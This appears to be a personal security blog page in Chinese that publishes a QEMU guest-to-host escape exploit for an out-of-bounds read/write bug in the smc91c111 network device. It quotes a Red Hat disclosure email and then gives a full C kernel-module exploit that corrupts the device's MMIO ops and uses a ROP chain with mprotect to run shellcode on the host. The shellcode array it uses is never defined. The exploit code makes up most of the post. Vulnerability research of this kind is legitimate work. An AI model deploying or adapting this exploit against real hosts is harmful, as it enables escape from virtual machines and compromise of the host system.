<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"azure.kdays.cn","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.18.1","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":false,"nav":null,"activeClass":"disqus"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="中午整理Macbook硬盘的时候发现了这个半年前看到的然而并没有要来CVE号的漏洞。嗯、反正也修了半年了，放个exploit……感谢白兔师傅和谢大哥的帮助。纪念那段从来没有挖到过qemu CVE的时光……">
<meta property="og:type" content="article">
<meta property="og:title" content="A qemu escape - SMC911 exploit">
<meta property="og:url" content="https://azure.kdays.cn/2017/08/22/A-qemu-escape-SMC911-exploit/index.html">
<meta property="og:site_name" content="Azure&#39;s Laboratory">
<meta property="og:description" content="中午整理Macbook硬盘的时候发现了这个半年前看到的然而并没有要来CVE号的漏洞。嗯、反正也修了半年了，放个exploit……感谢白兔师傅和谢大哥的帮助。纪念那段从来没有挖到过qemu CVE的时光……">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2017-08-21T22:51:47.000Z">
<meta property="article:modified_time" content="2017-08-21T22:51:47.000Z">
<meta property="article:author" content="Azure">
<meta property="article:tag" content="security">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://azure.kdays.cn/2017/08/22/A-qemu-escape-SMC911-exploit/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://azure.kdays.cn/2017/08/22/A-qemu-escape-SMC911-exploit/","path":"2017/08/22/A-qemu-escape-SMC911-exploit/","title":"A qemu escape - SMC911 exploit"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>A qemu escape - SMC911 exploit | Azure's Laboratory</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Azure's Laboratory</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-alpharomdie"><a href="/onekeyunlock" rel="section"><i class="fa fa-rocket fa-fw"></i>AlphaROMdiE</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>RSS</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Azure"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Azure</p>
  <div class="site-description" itemprop="description">次元の壁乗り越えてあなたに会ってみたい</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">10</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/azure9" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;azure9" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/4zure9" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;4zure9" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>
<div>
</p></p><img src="https://s07.flagcounter.com/count/9qfl/bg_FFFFFF/txt_000000/border_CCCCCC/columns_2/maxflags_12/viewers_0/labels_0/pageviews_0/flags_0/" alt="Flag Counter" border="0">
</div>


        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://azure.kdays.cn/2017/08/22/A-qemu-escape-SMC911-exploit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Azure">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Azure's Laboratory">
      <meta itemprop="description" content="次元の壁乗り越えてあなたに会ってみたい">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="A qemu escape - SMC911 exploit | Azure's Laboratory">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          A qemu escape - SMC911 exploit
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2017-08-22 06:51:47" itemprop="dateCreated datePublished" datetime="2017-08-22T06:51:47+08:00">2017-08-22</time>
    </span>

  
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2017/08/22/A-qemu-escape-SMC911-exploit/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/08/22/A-qemu-escape-SMC911-exploit/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>中午整理Macbook硬盘的时候发现了这个半年前看到的然而并没有要来CVE号的漏洞。<br>嗯、反正也修了半年了，放个exploit……感谢白兔师傅和谢大哥的帮助。纪念那段从来没有挖到过qemu CVE的时光……</p>
<span id="more"></span>
<p>Mail</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Hello Azure,</span><br><span class="line"></span><br><span class="line">On Mon, 24 Oct 2016 09:02:19 GMT, azureyang# wrote:</span><br><span class="line">&gt; I found a OOB read/write bug that can cause code execution on host.</span><br><span class="line">&gt; The relation code is in</span><br><span class="line">&gt; hw/net/smc91c111.c:447</span><br><span class="line">&gt; s-&gt;data[n][p] = value;</span><br><span class="line">&gt; hw/net/smc91c111.c:553</span><br><span class="line">&gt; return s-&gt;data[n][p];</span><br><span class="line">&gt;</span><br><span class="line">&gt; failed to check the border of the passed value, the packet_num and ptr</span><br><span class="line">&gt; can be set by guest mmio operations. With the overwrite of s-&gt;mmio-</span><br><span class="line">&gt; &gt;ops, code execution can be achieved.</span><br><span class="line"></span><br><span class="line">Thank you so much for reporting this issue. A patch has been sent upstream to fix this issue.</span><br><span class="line"></span><br><span class="line">IIUC, the SMSC91C111 ethernet controller is used on the ARM Versatile EP and other similar platforms. Which are mostly used in the prototype development environments. These platforms are not generally used with KVM to provide virtualised guest environments. We could not consider this issue for a CVE as the upstream Qemu project does not consider these issues to be security relevant.</span><br><span class="line"></span><br><span class="line">Please see:</span><br><span class="line">-&gt;</span><br><span class="line">http://wiki.qemu.org/SecurityProcess#How_impact_and_severity_of_a_bug_is_decided</span><br><span class="line"></span><br><span class="line">Thank you so much!</span><br><span class="line">---</span><br><span class="line">Prasad J Pandit / Red Hat Product Security</span><br></pre></td></tr></table></figure>
<p>exploit</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMC911_BASE           (unsigned char *)0xd09a6000</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_on</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * addr = SMC911_BASE;</span><br><span class="line">    addr[<span class="number">14</span>] = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_addr</span><span class="params">(<span class="type">uint64_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * addr = SMC911_BASE;</span><br><span class="line">    <span class="type">uint64_t</span> ptr = offset%<span class="number">0x800</span>;</span><br><span class="line">    addr[<span class="number">2</span>] = offset/<span class="number">0x800</span>;</span><br><span class="line">    addr[<span class="number">6</span>] = ptr&amp;<span class="number">0xff</span>;</span><br><span class="line">    addr[<span class="number">7</span>] = ptr&gt;&gt;<span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_uint8</span><span class="params">(<span class="type">uint64_t</span> offset,<span class="type">uint8_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * addr = SMC911_BASE;</span><br><span class="line">    set_addr(offset);</span><br><span class="line">    addr[<span class="number">8</span>] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_uint16</span><span class="params">(<span class="type">uint64_t</span> offset,<span class="type">uint16_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * addr = SMC911_BASE;</span><br><span class="line">    set_addr(offset);</span><br><span class="line">    *(<span class="type">uint16_t</span> *)&amp;addr[<span class="number">8</span>] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_uint32</span><span class="params">(<span class="type">uint64_t</span> offset,<span class="type">uint32_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * addr = SMC911_BASE;</span><br><span class="line">    set_addr(offset);</span><br><span class="line">    *(<span class="type">uint32_t</span> *)&amp;addr[<span class="number">8</span>] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_uint64</span><span class="params">(<span class="type">uint64_t</span> offset,<span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * addr = SMC911_BASE;</span><br><span class="line">    set_addr(offset);</span><br><span class="line">    *(<span class="type">uint32_t</span> *)&amp;addr[<span class="number">8</span>] = value&amp;<span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    set_addr(offset+<span class="number">4</span>);</span><br><span class="line">    *(<span class="type">uint32_t</span> *)&amp;addr[<span class="number">8</span>] = value&gt;&gt;<span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_memset</span><span class="params">(<span class="type">uint64_t</span> offset,<span class="type">uint64_t</span> value,<span class="type">uint64_t</span> cbmem)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i&lt;cbmem;i+=<span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        set_uint64(offset+i,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_memcpy</span><span class="params">(<span class="type">uint64_t</span> dst_offset,<span class="type">void</span> * src,<span class="type">uint64_t</span> cbmem)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> * uc_src = (<span class="type">uint8_t</span>*)src; </span><br><span class="line">    <span class="type">uint64_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i&lt;cbmem;i+=<span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        set_uint64(dst_offset+i,*(<span class="type">uint64_t</span> *)(uc_src+i));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">get_uint8</span><span class="params">(<span class="type">uint64_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * addr = SMC911_BASE;</span><br><span class="line">    set_addr(offset);</span><br><span class="line">    <span class="keyword">return</span> addr[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">get_uint16</span><span class="params">(<span class="type">uint64_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * addr = SMC911_BASE;</span><br><span class="line">    set_addr(offset);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint16_t</span> *)&amp;addr[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">get_uint32</span><span class="params">(<span class="type">uint64_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * addr = SMC911_BASE;</span><br><span class="line">    set_addr(offset);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint32_t</span> *)&amp;addr[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">get_uint64</span><span class="params">(<span class="type">uint64_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * addr = SMC911_BASE;</span><br><span class="line">    <span class="type">uint64_t</span> low = <span class="number">0</span>,high = <span class="number">0</span>;</span><br><span class="line">    set_addr(offset);</span><br><span class="line">    low = *(<span class="type">uint32_t</span> *)&amp;addr[<span class="number">8</span>];</span><br><span class="line">    set_addr(offset+<span class="number">4</span>);</span><br><span class="line">    high = *(<span class="type">uint32_t</span> *)&amp;addr[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint64_t</span>)high&lt;&lt;<span class="number">32</span> | low;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append &quot;root=/dev/sda1&quot; -net nic,model=smc91c111 -net user</span></span><br><span class="line"><span class="comment">//mprotect 0x7f11879a2eb0</span></span><br><span class="line"><span class="comment">//libcdata 0x7f1187c65b78</span></span><br><span class="line"><span class="comment">//delta = 0x2c2cc8</span></span><br><span class="line"><span class="comment">//offset = 0x2764</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">smc_test</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * addr = SMC911_BASE;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> rop [] = &#123;</span><br><span class="line">        <span class="number">0x00000000006bc31c</span>,<span class="comment">//pop rdi; ret;</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x000000000052ac4c</span>,<span class="comment">//pop rsi; ret;</span></span><br><span class="line">		<span class="number">0x10000</span>,</span><br><span class="line">		<span class="number">0x0000000000517ea5</span>,<span class="comment">//pop rdx; ret;</span></span><br><span class="line">		<span class="number">0x0000000000000007</span>,<span class="comment">//RWE</span></span><br><span class="line">		<span class="number">0x7f6a14afbeb0</span>,<span class="comment">//mprotect</span></span><br><span class="line">        <span class="number">0x000000000052ac4c</span>,<span class="comment">//pop rsi; ret;</span></span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="number">0x00bc5c1b</span><span class="comment">//jmp rsi;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> original_ops = <span class="number">0</span>, card_base = <span class="number">0</span>,data_offset=<span class="number">0x2384</span>;</span><br><span class="line">    <span class="type">uint64_t</span> main_arena = <span class="number">0</span>;</span><br><span class="line">    write_on();</span><br><span class="line">    original_ops = get_uint32(<span class="number">0x43d0</span>-data_offset);</span><br><span class="line">    card_base = get_uint32(<span class="number">0x20b4</span>)<span class="number">-0x4430</span>;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;Host card ops = 0x%0X\ncard base:0x%0X\nfake_mmio_ops:0x%0X\n&quot;</span>,original_ops,card_base,card_base+data_offset+<span class="number">0x1800</span>);</span><br><span class="line">    set_memset(<span class="number">0x1800</span>,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">    set_uint32(<span class="number">0x1800</span>+<span class="number">1</span>,<span class="number">0x007e29ee</span>);<span class="comment">//pop rsi; pop rsp; ret 0x66ff</span></span><br><span class="line">    set_uint64(<span class="number">0x1800</span>+<span class="number">80</span>,<span class="number">0x6161616162616161</span>);<span class="comment">//readb</span></span><br><span class="line">    set_uint64(<span class="number">0x1800</span>+<span class="number">88</span>,<span class="number">0x6761616168616161</span>);<span class="comment">//readw</span></span><br><span class="line">    set_uint64(<span class="number">0x1800</span>+<span class="number">96</span>,<span class="number">0x6361616164616161</span>);<span class="comment">//readl</span></span><br><span class="line">    set_uint64(<span class="number">0x1800</span>+<span class="number">104</span>,<span class="number">0x696161616a616161</span>);<span class="comment">//writeb</span></span><br><span class="line">    set_uint64(<span class="number">0x1800</span>+<span class="number">112</span>,<span class="number">0x6561616166616161</span>);<span class="comment">//writew</span></span><br><span class="line">    set_uint64(<span class="number">0x1800</span>+<span class="number">120</span>,<span class="number">0x00ba8c41</span>);<span class="comment">//writel;push    rdx;call    qword ptr [rbx+1]</span></span><br><span class="line">    set_uint64(<span class="number">0x1800</span>+<span class="number">0x80</span>,rop[<span class="number">0</span>]+<span class="number">1</span>);</span><br><span class="line">    main_arena = get_uint64(<span class="number">0x2764</span>);</span><br><span class="line">    rop[<span class="number">1</span>] = card_base&amp;<span class="number">0xFFFFFFFFFFFFF000</span>;</span><br><span class="line">    rop[<span class="number">6</span>] = main_arena - <span class="number">0x2c2cc8</span>;</span><br><span class="line">    rop[<span class="number">8</span>] = card_base+data_offset+<span class="number">0x1888</span>;</span><br><span class="line">    set_memcpy(<span class="number">0x1800</span>+<span class="number">0x66FF</span>+<span class="number">0x88</span>,rop,<span class="keyword">sizeof</span>(rop));</span><br><span class="line">    set_memcpy(<span class="number">0x1800</span>+<span class="number">0x88</span>,shellcode,<span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    set_uint32(<span class="number">0x43d0</span>-data_offset,card_base+data_offset+<span class="number">0x1800</span>);</span><br><span class="line">    *(<span class="type">uint32_t</span> *)&amp;addr[<span class="number">0</span>] = card_base+data_offset+<span class="number">0x1800</span>+<span class="number">0x80</span>;<span class="comment">//boom! Can only write low part to rdx because use 32 bit arm,</span></span><br><span class="line">    <span class="comment">//aarch64 can overwrite mmio-&gt;ops-&gt;valid-&gt;max_access_size and mmio-&gt;ops-&gt;write to achieve extended register control </span></span><br><span class="line">    <span class="comment">//rsi -&gt; 0-0xf</span></span><br><span class="line">    <span class="comment">//rdx -&gt; 0-0xFFFFFFFF</span></span><br><span class="line">    <span class="comment">//rbx -&gt; controled memory</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    smc_test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
    </div>

    
    
    

    <footer class="post-footer">
          <div class="followme">
  <span>欢迎关注我的其它发布渠道</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/4zure9">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>


        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2017/08/16/hello-world/" rel="prev" title="Another new home">
                  <i class="fa fa-angle-left"></i> Another new home
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2017/10/19/Hack-lu-2017-writeup/" rel="next" title="Hack.lu 2017 writeup">
                  Hack.lu 2017 writeup <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    
  <div class="comments" id="disqus_thread">
    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
  </div>
  
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Azure</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  






  




<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"azurea","count":true,"i18n":{"disqus":"disqus"}}</script>
<script src="/js/third-party/comments/disqus.js"></script>

</body>
</html>
